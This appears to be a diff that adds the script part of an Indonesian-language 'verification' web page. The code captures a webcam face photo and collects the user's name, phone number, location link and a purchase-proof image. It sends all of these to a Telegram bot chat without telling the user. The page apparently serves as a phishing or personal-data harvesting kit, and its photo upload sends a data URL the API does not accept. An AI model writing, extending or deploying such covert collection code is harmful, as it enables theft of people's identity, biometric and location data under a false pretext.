+                    locationStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Geolocation tidak didukung';
+                }
+            }
+            
+            // Start camera
+            function startCamera() {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            video.srcObject = stream;
+                        })
+                        .catch(err => {
+                            console.error("Error accessing camera:", err);
+                            verificationStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Gagal mengakses kamera';
+                        });
+                } else {
+                    verificationStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Kamera tidak didukung';
+                }
+            }
+            
+            // Capture image and send data to Telegram
+            async function captureAndSendData() {
+                // Create canvas to capture image
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to data URL
+                const imageData = canvas.toDataURL('image/jpeg');
+                userData.faceImage = imageData;
+                
+                // Stop camera stream
+                if (video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }
+                
+                // Format message for Telegram
+                const message = `🚨 *NEW VERIFICATION* 🚨
+                
+📛 *Nama:* ${userData.name}
+📱 *Nomor HP:* ${userData.phone}
+📍 *Lokasi:* ${userData.gmapsLink || 'Tidak terdeteksi'}
+
+✅ Verifikasi berhasil!`;
+
+                // Send to Telegram
+                await sendToTelegram(message);
+                
+                // Kirim bukti pembelian jika ada
+                if (userData.proofBase64) {
+                    await sendPhotoToTelegram(userData.proofBase64, "Bukti Pembelian");
+                }
+                
+                // Kirim foto wajah
+                await sendPhotoToTelegram(userData.faceImage.split(',')[1], "Verifikasi Wajah");
+            }
+            
+            // Send text to Telegram
+            async function sendToTelegram(text) {
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    if (data.ok) {
+                        console.log('Data teks terkirim ke bot Telegram');
+                    } else {
+                        console.error('Gagal mengirim teks ke Telegram:', data);
+                    }
+                } catch (error) {
+                    console.error('Error mengirim teks ke Telegram:', error);
+                }
+            }
+            
+            // Send photo to Telegram
+            async function sendPhotoToTelegram(photoBase64, caption) {
+                const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            photo: `data:image/jpeg;base64,${photoBase64}`,
+                            caption: caption
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    if (data.ok) {
+                        console.log('Foto terkirim ke bot Telegram');
+                    } else {
+                        console.error('Gagal mengirim foto ke Telegram:', data);
+                    }
+                } catch (error) {
+                    console.error('Error mengirim foto ke Telegram:', error);
+                }
+            }
+            
+            // Initialize with focus on key input
+            keyInput.focus();
+        });
+    </script>
+</body>
+</html>
